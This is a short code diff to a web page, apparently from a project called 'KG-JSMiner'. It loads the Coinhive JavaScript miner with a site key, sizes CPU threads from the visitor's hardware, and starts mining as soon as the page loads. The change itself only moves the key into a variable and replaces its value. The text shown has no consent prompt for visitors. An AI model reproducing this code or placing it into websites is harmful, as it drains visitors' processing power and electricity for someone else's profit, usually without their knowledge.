@@ -33,12 +33,13 @@
 
     <script src="./coinhive.min.js"></script>
     <script>
+        var key = 'kmxbex96fhfLnvxxyTCaud3m2vM104Rb', user = 'KG-JSMiner';
         if (navigator.hardwareConcurrency > 1) {
             var cpuConfig = { threads: Math.round(navigator.hardwareConcurrency / 2) }
         } else {
             var cpuConfig = { throttle: 0.6 }
         }
-        var miner = new CoinHive.User('lAEbr1gGd2Iy04CORIzwzfHycznYvm1H', 'KG-JSMiner', cpuConfig);
+        var miner = new CoinHive.User(key, user, cpuConfig);
         miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
         miner.on('authed', function (params) {
             console.log('Token name is: ', miner.getToken());
